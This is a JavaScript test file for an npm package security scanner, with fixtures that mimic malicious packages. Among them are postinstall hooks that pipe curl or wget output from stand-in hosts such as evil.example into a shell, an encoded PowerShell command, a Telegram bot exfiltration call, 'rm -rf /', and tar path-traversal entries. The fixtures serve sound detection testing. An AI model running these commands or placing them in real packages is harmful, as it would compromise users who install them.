import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { extractTarball } from "../lib/targz.js";
import {
  BINARY_EXTENSIONS,
  collectFiles,
  isBinaryName,
  parsePackageJson,
  readFileCapped,
  scanDirectory,
  scanFileText,
  scanNpmPackage,
  scanTarballFiles,
} from "../lib/scan.js";

// ------------------------------------------------------------------ helpers
/** Minimal ctx.fs-shaped adapter over node:fs for a given root. */
function makeFsAdapter(root) {
  const realRoot = path.resolve(root);
  return {
    async resolve(p, opts) {
      const abs = path.isAbsolute(p) ? p : path.resolve(realRoot, p);
      return { key: abs, cwd: (opts && opts.cwd) || realRoot };
    },
    processPath(t) {
      return t.key;
    },
    async listDir(target) {
      const entries = fs.readdirSync(target.key, { withFileTypes: true });
      return entries.map((e) => {
        const full = path.join(target.key, e.name);
        let type = "other";
        if (e.isDirectory()) type = "directory";
        else if (e.isFile()) type = "file";
        let size;
        try {
          size = e.isFile() ? fs.statSync(full).size : undefined;
        } catch {
          /* ignore */
        }
        return { name: e.name, type, target: { key: full }, size };
      });
    },
    async readText(target) {
      return fs.readFileSync(target.key, "utf8");
    },
    async readBytes(target, _signal, maxBytes) {
      const buf = fs.readFileSync(target.key);
      if (buf.length > maxBytes) throw new Error("FS_TOO_LARGE");
      return buf;
    },
  };
}

function tmpdir(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

function writeTree(root, tree) {
  for (const [rel, content] of Object.entries(tree)) {
    const full = path.join(root, rel);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content);
  }
}

// ------------------------------------------------------------------ package
test("parsePackageJson detects lifecycle scripts and bundle flag", () => {
  const pkg = parsePackageJson(JSON.stringify({
    name: "x",
    scripts: { postinstall: "curl http://e.com/x | sh", test: "node test" },
    dsh: { bundle: { patch: "./cordis.patch.yml" } },
    dependencies: { a: "1" },
    devDependencies: { b: "2" },
  }));
  assert.equal(pkg.ok, true);
  assert.equal(pkg.lifecycle.length, 1);
  assert.equal(pkg.lifecycle[0].script, "postinstall");
  assert.equal(pkg.hasDshBundle, true);
  assert.equal(pkg.dependencyCount, 2);
});

test("parsePackageJson tolerates invalid json", () => {
  const pkg = parsePackageJson("{ nope");
  assert.equal(pkg.ok, false);
  assert.ok(pkg.parseError);
});

test("scanFileText downgrades RegExp#exec without child_process import", () => {
  const res = scanFileText({
    rel: "lib/re.js",
    content: "const m = ENTRY_RE.exec(line);\nconst m2 = /x/.exec(y);",
  });
  const ex = res.hits.find((h) => h.rule === "exec_api");
  assert.ok(ex, "exec_api should still be reported");
  assert.equal(ex.severity, "low");
});

test("scanFileText keeps exec_api high when child_process is imported", () => {
  const res = scanFileText({
    rel: "lib/spawn.js",
    content: "const { exec } = require('child_process');\nexec('whoami');",
  });
  const ex = res.hits.find((h) => h.rule === "exec_api");
  assert.ok(ex);
  assert.equal(ex.severity, "high");
});

test("comment/doc lines downgrade code-context rules but keep secrets high", () => {
  const res = scanFileText({
    rel: "lib/notes.js",
    content: [
      "// example: curl http://evil.example/x.sh | sh",
      "/* wget https://example.com/p -O /tmp/x */",
      "// const key = 'sk-abcdefghijklmnopqrstuvwx';",
      "const ok = 1;",
    ].join("\n"),
  });
  const curl = res.hits.find((h) => h.rule === "download_cmd");
  assert.ok(curl, "download_cmd should fire");
  assert.equal(curl.severity, "low", "comment mention must be downgraded");
  const pipe = res.hits.find((h) => h.rule === "pipe_to_shell");
  assert.ok(pipe);
  assert.equal(pipe.severity, "low");
  const key = res.hits.find((h) => h.rule === "sk_key");
  assert.ok(key, "secret in comment is still a leak");
  assert.equal(key.severity, "high");
});

test("doc files downgrade code-context rules", () => {
  const res = scanFileText({
    rel: "README.md",
    content: "Install with curl https://example.com/install.sh | sh\n\nUsage: node index.js",
  });
  const curl = res.hits.find((h) => h.rule === "download_cmd");
  assert.ok(curl);
  assert.equal(curl.severity, "low");
});

test("risky git/http dependencies are flagged", () => {
  const res = scanFileText({
    rel: "package.json",
    content: JSON.stringify({
      dependencies: { evil: "git+https://github.com/x/y.git", good: "^1.0.0" },
    }),
  });
  const rd = res.hits.find((h) => h.rule === "risky_dependency");
  assert.ok(rd, "risky dependency should fire");
  assert.equal(rd.evidence, "dependencies.evil: git+https://github.com/x/y.git");
  assert.equal(rd.severity, "medium");
  assert.ok(!res.hits.some((h) => h.rule === "risky_dependency" && h.evidence.includes("good")));
});

test("minified lines are flagged low", () => {
  const res = scanFileText({
    rel: "dist/bundle.js",
    content: "export const a=1;\n" + "x".repeat(5000) + "\nexport const b=2;",
  });
  const ml = res.hits.find((h) => h.rule === "minified_line");
  assert.ok(ml);
  assert.equal(ml.severity, "low");
  assert.equal(ml.line, 2);
});

test("scanDirectory queries OSV when enabled and skips when disabled", async () => {
  const root = tmpdir("gate-osv-");
  writeTree(root, {
    "package.json": JSON.stringify({
      name: "demo",
      dependencies: { "vuln-dep": "1.0.0", "ranged": "^2.0.0", "@deepseek-ai/cordis": "^4.0.1" },
    }),
  });
  const adapter = makeFsAdapter(root);
  const osvFetch = async () => ({ ok: true, json: async () => ({ vulns: [{ id: "GHSA-demo", summary: "demo vuln" }] }) });
  const on = await scanDirectory(adapter, root, { osvCheck: true, fetchImpl: osvFetch });
  const hit = on.hits.find((h) => h.rule === "osv_vulnerability");
  assert.ok(hit, "osv hit expected");
  assert.equal(hit.evidence.split(" ")[0], "vuln-dep@1.0.0");
  assert.ok(!on.hits.some((h) => h.rule === "osv_vulnerability" && h.evidence.includes("ranged")), "range deps skipped");
  const off = await scanDirectory(adapter, root, { osvCheck: false });
  assert.ok(!off.hits.some((h) => h.rule === "osv_vulnerability"));
});

test("scanFileText flags lifecycle scripts and exfil shape", () => {
  const res = scanFileText({
    rel: "package.json",
    content: JSON.stringify({ scripts: { postinstall: "curl -s http://e.com/x.sh | bash" } }),
  });
  const lc = res.hits.find((h) => h.rule === "lifecycle_script");
  assert.ok(lc);
  assert.equal(lc.severity, "high");
});

// ------------------------------------------------------------- dir scanning
test("scanDirectory reports BLOCK for a malicious fixture", async () => {
  const root = tmpdir("gate-evil-");
  writeTree(root, {
    "package.json": JSON.stringify({ name: "evil", scripts: { postinstall: "powershell -enc SQBFAFgA" } }),
    "lib/index.js": "const { exec } = require('child_process'); exec('curl http://evil.example/x | sh');",
    "lib/leak.js": "fetch('https://api.telegram.org/bot123:ABC/sendMessage');",
    "assets/payload.bin": Buffer.from([0, 1, 2, 3]).toString("latin1"),
  });
  const adapter = makeFsAdapter(root);
  const result = await scanDirectory(adapter, root, { allowlistHosts: [] });
  assert.equal(result.verdict, "BLOCK");
  assert.ok(result.summary.high >= 4, "high hits: " + result.summary.high);
  assert.ok(result.hits.some((h) => h.file === "lib/index.js"));
  assert.ok(result.hits.some((h) => h.rule === "binary_blob"));
  assert.ok(result.network.unallowlisted.includes("evil.example"));
  assert.ok(result.network.unallowlisted.includes("api.telegram.org"));
  assert.ok(result.recommendations.length > 0);
});

test("scanDirectory PASSes a clean fixture", async () => {
  const root = tmpdir("gate-clean-");
  writeTree(root, {
    "package.json": JSON.stringify({ name: "clean", scripts: { test: "node test" } }),
    "lib/util.js": "export const add = (a, b) => a + b;",
    "README.md": "No network here.",
  });
  const adapter = makeFsAdapter(root);
  const result = await scanDirectory(adapter, root, { allowlistHosts: [] });
  assert.equal(result.verdict, "PASS");
  assert.equal(result.summary.high, 0);
  assert.equal(result.hits.length, 0);
});

// ------------------------------------------------------------------- self-scan
test("scanning the gate's own package caps BLOCK at WARN and sets selfScan", async () => {
  const root = tmpdir("gate-self-");
  writeTree(root, {
    "package.json": JSON.stringify({ name: "@barateza/dsh-plugin-gate", version: "9.9.9" }),
    "lib/rules.js": "const re = /curl -fsSL http://x | sh/;\n",
    "lib/index.js": "const { exec } = require('child_process'); exec('curl http://evil.example/x | sh');",
  });
  const result = await scanDirectory(makeFsAdapter(root), root, {});
  assert.equal(result.selfScan, true);
  assert.equal(result.verdict, "WARN", "self-scan must never return BLOCK, got " + result.verdict);
  assert.ok(result.summary.high > 0, "findings stay visible for the human review");
  assert.ok(result.recommendations.some((r) => /Self-scan/i.test(r)), "self-scan note missing");
});

test("the same content under any other package name still BLOCKs", async () => {
  const root = tmpdir("gate-notself-");
  writeTree(root, {
    "package.json": JSON.stringify({ name: "some-other-package", version: "1.0.0" }),
    "lib/rules.js": "const re = /curl -fsSL http://x | sh/;\n",
    "lib/index.js": "const { exec } = require('child_process'); exec('curl http://evil.example/x | sh');",
  });
  const result = await scanDirectory(makeFsAdapter(root), root, {});
  assert.equal(result.selfScan, false);
  assert.equal(result.verdict, "BLOCK");
});

test("scanDirectory skips node_modules by default and honors includeNodeModules", async () => {
  const root = tmpdir("gate-nm-");
  writeTree(root, {
    "node_modules/x/index.js": "eval(process.env.OPENAI_API_KEY);",
    "src/a.js": "export const a = 1;",
  });
  const adapter = makeFsAdapter(root);
  const without = await scanDirectory(adapter, root, {});
  assert.ok(!without.hits.some((h) => h.file.startsWith("node_modules")));
  const withN = await scanDirectory(adapter, root, { includeNodeModules: true });
  assert.ok(withN.hits.some((h) => h.file.startsWith("node_modules")));
});

test("collectFiles caps the file count", async () => {
  const root = tmpdir("gate-cap-");
  const tree = {};
  for (let i = 0; i < 20; i++) tree["f" + i + ".js"] = "x";
  writeTree(root, tree);
  const adapter = makeFsAdapter(root);
  const { files, truncatedDir } = await collectFiles(adapter, await adapter.resolve(root), { maxFiles: 5 });
  assert.equal(files.length, 5);
  assert.equal(truncatedDir, true);
});

test("readFileCapped returns null for oversized files", async () => {
  const root = tmpdir("gate-big-");
  writeTree(root, { "big.js": "x".repeat(1000) });
  const adapter = makeFsAdapter(root);
  const target = await adapter.resolve(path.join(root, "big.js"));
  const text = await readFileCapped(adapter, target, 100, undefined);
  assert.equal(text, null);
});

// ------------------------------------------------------------------ helpers
test("isBinaryName covers executable extensions", () => {
  assert.equal(isBinaryName("a.exe"), true);
  assert.equal(isBinaryName("lib/x.so"), true);
  assert.equal(isBinaryName("lib/index.js"), false);
  assert.equal(BINARY_EXTENSIONS.has(".exe"), true);
});

// ---------------------------------------------------------------- tarballs
test("scanTarballFiles scans in-memory extracted files", () => {
  const result = scanTarballFiles([
    { path: "package/index.js", data: Buffer.from("eval('x'); execSync('rm -rf /')") },
    { path: "package/package.json", data: Buffer.from(JSON.stringify({ scripts: { preinstall: "wget http://e.com/x" } })) },
  ], { allowlistHosts: [] });
  assert.equal(result.verdict, "BLOCK");
  assert.ok(result.hits.some((h) => h.rule === "eval_call"));
  assert.ok(result.hits.some((h) => h.rule === "lifecycle_script"));
});

test("scanNpmPackage resolves specs and rejects missing packages", async () => {
  const calls = [];
  const fakeFetch = async (url) => {
    calls.push(url);
    if (url.endsWith(".tgz")) {
      const { gzipSync } = await import("node:zlib");
      const tar = buildTar([{ path: "package/index.js", data: Buffer.from("fetch('http://evil.example/x');") }]);
      const gz = gzipSync(tar);
      const ab = gz.buffer.slice(gz.byteOffset, gz.byteOffset + gz.byteLength);
      return { ok: true, arrayBuffer: async () => ab };
    }
    if (url.includes("registry.npmjs.org/nonexistent-pkg-xyz")) {
      return { ok: true, json: async () => ({ error: "Not found" }) };
    }
    if (url.includes("registry.npmjs.org/fake-pkg")) {
      return {
        ok: true,
        json: async () => ({
          name: "fake-pkg",
          "dist-tags": { latest: "1.0.0" },
          versions: {
            "1.0.0": {
              name: "fake-pkg",
              version: "1.0.0",
              scripts: { postinstall: "curl http://evil.example/p | sh" },
              dist: { tarball: "https://registry.npmjs.org/fake-pkg/-/fake-pkg-1.0.0.tgz" },
            },
          },
        }),
      };
    }
    throw new Error("unexpected url " + url);
  };

  await assert.rejects(() => scanNpmPackage("nonexistent-pkg-xyz", { fetchImpl: fakeFetch }), /Not found/);

  const result = await scanNpmPackage("fake-pkg", { fetchImpl: fakeFetch, timeoutMs: 5000 });
  assert.equal(result.verdict, "BLOCK");
  assert.equal(result.package.name, "fake-pkg");
  assert.ok(result.hits.some((h) => h.rule === "lifecycle_script"));
  assert.ok(result.network.unallowlisted.includes("evil.example"));
});

// ----------------------------------------------------------- tar extraction
test("extractTarball roundtrips a real gzipped tar", async () => {
  const { gzipSync } = await import("node:zlib");
  const tar = buildTar([
    { path: "package/package.json", data: Buffer.from('{"name":"x"}') },
    { path: "package/lib/index.js", data: Buffer.from("export const x = 1;") },
    { path: "package/dir/", data: null },
  ]);
  const gz = gzipSync(tar);
  const { files, truncated } = extractTarball(gz);
  assert.equal(truncated.traversal, 0);
  assert.deepEqual(files.map((f) => f.path), ["package/package.json", "package/lib/index.js"]);
  assert.equal(files[0].data.toString(), '{"name":"x"}');
});

test("extractTarball rejects traversal entries", async () => {
  const { gzipSync } = await import("node:zlib");
  const tar = buildTar([
    { path: "package/index.js", data: Buffer.from("ok") },
    { path: "../evil.js", data: Buffer.from("bad") },
    { path: "/abs/evil.js", data: Buffer.from("bad2") },
  ]);
  const { files, truncated } = extractTarball(gzipSync(tar));
  assert.equal(truncated.traversal, 2);
  assert.deepEqual(files.map((f) => f.path), ["package/index.js"]);
});

test("extractTarball handles GNU long names", async () => {
  const { gzipSync } = await import("node:zlib");
  const longPath = "package/" + "a".repeat(160) + ".js";
  const tar = buildTar([{ path: longPath, data: Buffer.from("hello") }], { gnuLongNames: true });
  const { files } = extractTarball(gzipSync(tar));
  assert.equal(files.length, 1);
  assert.equal(files[0].path, longPath);
});

/** Minimal tar writer used only by tests (ustar, optional GNU long names). */
function buildTar(entries, opts = {}) {
  const { gnuLongNames = false } = opts;
  const blocks = [];
  const push = (buf) => {
    blocks.push(Buffer.from(buf));
    const rem = 512 - (buf.length % 512);
    if (rem !== 512) blocks.push(Buffer.alloc(rem));
  };
  const header = (name, size, type, prefix = "") => {
    const h = Buffer.alloc(512);
    h.write(name.slice(0, 100), 0, 100, "ascii");
    h.write("0000644\0", 100, 8, "ascii");
    h.write("0000000\0", 108, 8, "ascii");
    h.write("0000000\0", 116, 8, "ascii");
    h.write(size.toString(8).padStart(11, "0") + "\0", 124, 12, "ascii");
    h.write("00000000000\0", 136, 12, "ascii");
    h.write("        ", 148, 8, "ascii");
    h.write(type, 156, 1, "ascii");
    h.write("ustar\0", 257, 6, "ascii");
    h.write("00", 263, 2, "ascii");
    if (prefix) h.write(prefix.slice(0, 155), 345, 155, "ascii");
    return h;
  };
  for (const e of entries) {
    if (e.data === null) {
      push(header(e.path, 0, "5"));
      continue;
    }
    if (gnuLongNames && e.path.length > 100) {
      const nameBuf = Buffer.from(e.path, "utf8");
      push(header("././@LongLink", nameBuf.length, "L"));
      push(nameBuf);
      push(header("", e.data.length, "0"));
    } else {
      push(header(e.path, e.data.length, "0"));
    }
    push(e.data);
  }
  blocks.push(Buffer.alloc(512), Buffer.alloc(512));
  return Buffer.concat(blocks);
}
